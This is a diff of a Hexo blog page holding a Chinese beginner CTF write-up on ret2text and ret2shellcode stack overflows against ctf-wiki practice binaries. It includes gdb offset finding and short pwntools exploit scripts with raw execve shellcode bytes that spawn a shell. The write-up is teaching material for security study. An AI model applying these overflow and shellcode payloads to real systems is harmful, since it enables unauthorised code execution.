@@ -6,17 +6,39 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://username.github.io">
-  <title>Tag: Rce | Hexo</title>
+  <title>basic-pwn | Hexo</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="https://username.github.io/tags/Rce/index.html">
+  <meta name="description" content="pwn从0开始  多种ROP利用ret2text从ctfwiki上下载ret2text二进制程序，链接 使用checksec检查是否开启相关保护，可以看出，无地址随机化，无canary，仅仅开启了不可执行栈。该程序为32位程序，拖入IDA 32反汇编查看。  IDA反汇编后，查看main函数，F5生成源代码，gets()函数存在堆溢出  View-&gt;Open subviews-&gt;str">
+<meta property="og:type" content="article">
+<meta property="og:title" content="basic-pwn">
+<meta property="og:url" content="https://username.github.io/2023/11/15/basic-pwn/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="pwn从0开始  多种ROP利用ret2text从ctfwiki上下载ret2text二进制程序，链接 使用checksec检查是否开启相关保护，可以看出，无地址随机化，无canary，仅仅开启了不可执行栈。该程序为32位程序，拖入IDA 32反汇编查看。  IDA反汇编后，查看main函数，F5生成源代码，gets()函数存在堆溢出  View-&gt;Open subviews-&gt;str">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231112154156552.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231112155202026.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231112162650631.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231112162754606.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231112172001421.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231112175110982.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231112175224002.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231115011728917.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231115012036805.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\v2-db1beae537441e72682b5932b97770b0_1440w.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231115013211426.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231115013459253.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231115023744926.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231115023800150.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231115023952729.png">
+<meta property="og:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231115031232593.png">
+<meta property="article:published_time" content="2023-11-14T19:25:02.000Z">
+<meta property="article:modified_time" content="2023-11-14T19:26:10.860Z">
 <meta property="article:author" content="Isabella">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:\Myblog\source\images\basic-pwn.assets\image-20231112154156552.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -207,65 +229,315 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-basic-pwn" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2021/01/30/gdb%E8%B0%83%E8%AF%95/" class="archive-article-date">
-        <time datetime="2021-01-29T16:48:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-30</time>
-</a>
-
-        </div>
-    	 
+      <header class="article-header">
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2021/01/30/gdb%E8%B0%83%E8%AF%95/" target="_blank">gdb调试</a>
   
+    <h1 class="article-title" itemprop="name">
+      basic-pwn
     </h1>
   
 
 
-        <div class="article-info info-on-right">
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2023/11/15/basic-pwn/" class="archive-article-date">
+        <time datetime="2023-11-14T19:25:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-11-15</time>
+</a>
+
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">4分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <center>pwn从0开始</center>
+
+<h2 id="多种ROP利用"><a href="#多种ROP利用" class="headerlink" title="多种ROP利用"></a>多种ROP利用</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>从ctfwiki上下载ret2text二进制程序，<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text">链接</a></p>
+<p>使用<code>checksec</code>检查是否开启相关保护，可以看出，无地址随机化，无canary，仅仅开启了不可执行栈。该程序为32位程序，拖入IDA 32反汇编查看。</p>
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231112154156552.png" alt="image-20231112154156552"></p>
+<p>IDA反汇编后，查看main函数，F5生成源代码，gets()函数存在堆溢出</p>
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231112155202026.png" alt="image-20231112155202026"></p>
+<p>View-&gt;Open subviews-&gt;strings查询关键字（也可以shift+F12）可以看到，数据资源段有调用&#x2F;bin&#x2F;sh</p>
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231112162650631.png" alt="image-20231112162650631"></p>
+<p>具体位置在secure函数中(空格键查看文本视图)，地址<code>0x0804863A</code></p>
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231112162754606.png" alt="image-20231112162754606"></p>
+<p>目前需要控制gets()函数，使得返回地址直接跳转到system(“&#x2F;bin&#x2F;sh”)处，因此需要计算偏移量。使用gdb运行中调试，在gets()函数处下断点</p>
+<p><code>b *0x080486AE</code>将断点打在gets()函数处，查询此处栈内情况</p>
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231112172001421.png" alt="image-20231112172001421"></p>
+<p>可以看出<code>esp:0xffffd3d0</code>，gets()函数写入的参数地址为[esp+1Ch]，计算可得其地址为<code>0xffffd3ec</code>，相较于ebp的偏移为<code>0xffffd458-0xffffd3ec=0x6c</code>，因此返回地址相较于ebp的偏移为[0x6c+4]。</p>
+<p>编写payload，其中p32(target)使用+进行字符拼接，需要转换成可编码的形式，因此使用<code>.decode(&quot;iso-8859-1&quot;)</code>。&#x3D;&#x3D;补充，其实直接b”A”*(0x6c+4)就行&#x3D;&#x3D;</p>
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231112175110982.png" alt="image-20231112175110982"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">proc=process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">target=<span class="number">0x0804863a</span></span><br><span class="line">proc.sendline(<span class="string">b&quot;A&quot;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(target))</span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231112175224002.png" alt="image-20231112175224002"></p>
+<p>最终得到shell</p>
+<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>直接checksec</p>
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231115011728917.png" alt="image-20231115011728917"></p>
+<p>可以看出，32位程序，啥也没开，导入IDA</p>
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231115012036805.png" alt="image-20231115012036805"></p>
+<p>反汇编出的内容可以看出，这次没有system()函数调用了，但仍存在栈溢出点，strncpy函数将字符数组s的内容copy入buf2，产生栈溢出。但是由于该程序并未开启不可执行栈，因此可以在栈上插入我们的shellcode，控制返回地址到我们的shellcode处从而执行。</p>
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\v2-db1beae537441e72682b5932b97770b0_1440w.png" alt="v2-db1beae537441e72682b5932b97770b0_1440w"></p>
+<p>下表补充ELF文件结构</p>
+<table>
+<thead>
+<tr>
+<th align="center">段名</th>
+<th align="center">存储属性</th>
+<th align="center">内存分配</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">代码段 .text</td>
+<td align="center">存放可执行程序的指令，存储态和运行态都有</td>
+<td align="center">静态</td>
+</tr>
+<tr>
+<td align="center">数据段 .data</td>
+<td align="center">存放已初始化（非零初始化的全局变量和静态局部变量）的数据，存储态和运行态都有</td>
+<td align="center">静态</td>
+</tr>
+<tr>
+<td align="center">bss段 .bss</td>
+<td align="center">存放未初始化（未初始化或者0初始化的全局变量和静态局部变量）的数据，存储态和运行态都有</td>
+<td align="center">静态</td>
+</tr>
+<tr>
+<td align="center">堆 heap</td>
+<td align="center">动态分配内存，需要通过malloc手动申请，free手动释放，适合大块内存。容易造成内存泄漏和内存碎片。运行态才有。</td>
+<td align="center">动态</td>
+</tr>
+<tr>
+<td align="center">栈 stack</td>
+<td align="center">存放函数局部变量和参数以及返回值，函数返回后，由操作系统立即回收。栈空间不大，使用不当容易栈溢出。运行态才有</td>
+<td align="center">静态</td>
+</tr>
+</tbody></table>
+<p>查找buf2的地址，可以直接在.bss段找，地址为<code>0x0804A080</code>。</p>
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231115013211426.png" alt="image-20231115013211426"></p>
+<p>gdb动态调试代码，在main函数处下断点，使用<code>vmmap</code>查看栈的状态</p>
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231115013459253.png" alt="image-20231115013459253"></p>
+<p>（gef直接高亮闪烁hhh），stack区域可写可读可执行，ret2shellcode方法</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从IDA的反汇编结果看，s距离ebp的偏移量为64h，实际得再gdb上调试（这里IDA的是错误的）</p>
+<p>换用gdb-peda插件，<code>pattern create 150</code>，生成150个字符，复制输入，<code>c</code>运行报错（提前下断点<code>b main</code>）。</p>
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231115023744926.png" alt="image-20231115023744926"></p>
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231115023800150.png" alt="image-20231115023800150"></p>
+<p>可以看出，ebp被覆盖掉了，覆盖内容为<code>MAAi</code>，使用命令<code>pattern offset MAAi</code>，即可计算出真实偏移量，为108。</p>
+<p>调用pwn库函数的指令<code>asm(shellcraft.sh())</code>生成shellcode，查看其长度为44字节</p>
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231115023952729.png" alt="image-20231115023952729"></p>
+<p>则我们需要填充的垃圾字符长度为<code>108-44+4=68</code>，(+4为返回地址)，所以可以构造脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">proc=process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#shellcode=b&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#payload=shellcode+b&quot;A&quot;*89+p32(0x0804a080)</span></span><br><span class="line">payload=shellcode+<span class="string">b&quot;A&quot;</span>*<span class="number">68</span>+p32(<span class="number">0x0804a080</span>)</span><br><span class="line">proc.recvline()</span><br><span class="line">proc.sendline(payload)</span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\Myblog\source\images\basic-pwn.assets\image-20231115031232593.png" alt="image-20231115031232593"></p>
+<p>很奇怪，EOF了，但是又好像getshell了</p>
+
+    
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/1.jpg">
+                    <span class="reward-type">支付宝</span>
+                  </div>
+                  
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/2.png">
+                    <span class="reward-type">微信</span>
+                  </div>
+                  
+                </div>
+              </span>
+            </span>
+          </span>
+        </div>
+      </a>
+    </div>
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          Isabella
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://username.github.io/2023/11/15/basic-pwn/" title="basic-pwn" target="_blank">https://username.github.io/2023/11/15/basic-pwn/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Rce</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
+    
 
     
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://username.github.io/2023/11/15/basic-pwn/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2021/03/07/CTF-web%E5%AD%A6%E4%B9%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CTF-web学习</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+
+
+
+
+
+
+
 
 
           </div>
@@ -306,9 +578,9 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
@@ -440,6 +712,10 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">python.学习篇</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">pwn</a>
               </li>
             
             <div class="clearfix"></div>
